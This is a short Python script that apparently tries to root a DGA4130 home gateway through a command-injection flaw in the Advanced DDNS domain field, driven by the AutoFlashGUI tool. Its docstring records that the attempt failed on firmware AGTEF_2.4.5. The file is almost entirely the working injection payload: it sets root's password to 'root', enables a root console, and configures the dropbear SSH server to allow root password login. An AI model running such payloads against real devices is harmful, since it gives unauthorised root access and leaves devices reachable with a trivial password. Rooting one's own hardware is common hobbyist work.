"""Attempt root via AutoFlashGUI's "Advanced DDNS (Generic)" command-injection
variant (ddns_domain field, /modals/wanservices-modal.lp).

Result on AGTEF_2.4.5 (VBNT-K / DGA4130): commands sent without any
transport error, but dropbear/SSH never came up afterwards -- see the guide
for the other two variants also tried, and the conclusion that this class of
injection appears to be patched in this firmware version.
"""
from afg_inject_common import afg, HOST, USERNAME, PASSWORD

CMD = (
    "sed -i 's#/root:.*$#/root:/bin/ash#' /etc/passwd;"
    "echo root:root | chpasswd;"
    "sed -i -e 's/#//' -e 's#askconsole:.*\\$#askconsole:/bin/ash#' /etc/inittab;"
    "uci -q delete dropbear.afg;"
    "uci add dropbear dropbear;"
    "uci rename dropbear.@dropbear[-1]=afg;"
    "uci set dropbear.afg.enable='1';"
    "uci set dropbear.afg.Interface='lan';"
    "uci set dropbear.afg.Port='22';"
    "uci set dropbear.afg.IdleTimeout='600';"
    "uci set dropbear.afg.PasswordAuth='on';"
    "uci set dropbear.afg.RootPasswordAuth='on';"
    "uci set dropbear.afg.RootLogin='1';"
    "uci commit dropbear;"
    "/etc/init.d/dropbear enable;"
    "/etc/init.d/dropbear restart"
)

result = afg.mainScript(
    host=HOST,
    username=USERNAME,
    password=PASSWORD,
    flashFirmware=False,
    upgradeFilename="",
    flashSleepDelay=120,
    activeMethod="AdvancedDDNS",
    activeCommand=CMD,
    splitCommand=True,
    ddnsService="dyndns.org",
    connectRetryDelay=5,
    interCommandDelay=5,
)
print("RESULT:", result)
